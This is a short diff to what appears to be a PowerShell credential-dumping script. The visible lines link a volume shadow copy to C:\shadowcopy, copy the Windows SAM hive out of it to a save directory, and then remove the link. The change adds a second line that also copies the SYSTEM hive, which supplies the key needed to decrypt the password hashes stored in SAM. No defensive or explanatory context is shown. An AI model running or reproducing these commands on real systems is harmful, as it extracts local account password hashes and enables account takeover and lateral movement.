@@ -48,6 +48,8 @@ cmd /c mklink C:\shadowcopy $addSlash
 
 Copy-Item 'C:\shadowcopy\Windows\System32\config\SAM' $fileSaveDir
 
+Copy-Item 'C:\shadowcopy\Windows\System32\config\SYSTEM' $fileSaveDir
+
 Remove-Item -recurse -force 'C:\shadowcopy'
 
 
